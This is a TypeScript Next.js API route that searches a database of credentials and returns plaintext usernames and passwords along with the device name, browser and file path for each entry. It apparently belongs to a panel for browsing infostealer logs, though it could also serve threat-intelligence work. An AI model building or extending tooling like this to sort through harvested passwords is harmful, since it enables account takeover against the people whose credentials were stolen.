import { NextRequest, NextResponse } from "next/server"
import { executeQuery } from "@/lib/mysql"
import { validateRequest } from "@/lib/auth"

/**
 * GET /api/v1/credentials/search
 * Search credentials globally with filters
 * Query params:
 *   - q: Search query (searches username, domain, url)
 *   - domain: Filter by domain
 *   - browser: Filter by browser
 *   - limit: Results limit (default 100)
 *   - offset: Pagination offset (default 0)
 */
export async function GET(request: NextRequest) {
  // Validate authentication
  const user = await validateRequest(request)
  if (!user) {
    return NextResponse.json({ success: false, error: "Unauthorized" }, { status: 401 })
  }

  try {
    const { searchParams } = new URL(request.url)
    const searchQuery = searchParams.get("q") || ""
    const domain = searchParams.get("domain") || ""
    const browser = searchParams.get("browser") || ""
    const limit = Number.parseInt(searchParams.get("limit") || "100")
    const offset = Number.parseInt(searchParams.get("offset") || "0")

    let query = `
      SELECT
        c.id,
        c.device_id,
        d.device_name,
        c.url,
        c.domain,
        c.tld,
        c.username,
        c.password,
        c.browser,
        c.file_path,
        c.created_at
      FROM credentials c
      JOIN devices d ON c.device_id = d.device_id
      WHERE 1=1
    `

    const params: any[] = []

    // Search query
    if (searchQuery) {
      query += ` AND (
        c.username LIKE ? OR
        c.domain LIKE ? OR
        c.url LIKE ?
      )`
      const searchPattern = `%${searchQuery}%`
      params.push(searchPattern, searchPattern, searchPattern)
    }

    // Domain filter
    if (domain) {
      query += ` AND c.domain = ?`
      params.push(domain)
    }

    // Browser filter
    if (browser) {
      query += ` AND c.browser = ?`
      params.push(browser)
    }

    // Get total count
    const countQuery = query.replace(
      /SELECT[\s\S]*?FROM/,
      "SELECT COUNT(*) as total FROM",
    )
    const countResult = (await executeQuery(countQuery, params)) as any[]
    const total = countResult[0]?.total || 0

    // Add pagination
    query += ` ORDER BY c.created_at DESC LIMIT ? OFFSET ?`
    params.push(limit, offset)

    const credentials = (await executeQuery(query, params)) as any[]

    return NextResponse.json({
      success: true,
      total,
      limit,
      offset,
      credentials: credentials.map((cred) => ({
        id: cred.id,
        device_id: cred.device_id,
        device_name: cred.device_name,
        url: cred.url || "",
        domain: cred.domain || "",
        tld: cred.tld || "",
        username: cred.username || "",
        password: cred.password || "",
        browser: cred.browser || "Unknown",
        file_path: cred.file_path || "",
        created_at: cred.created_at,
      })),
    })
  } catch (error) {
    console.error("Error searching credentials:", error)
    return NextResponse.json(
      {
        success: false,
        error: error instanceof Error ? error.message : "Failed to search credentials",
      },
      { status: 500 },
    )
  }
}
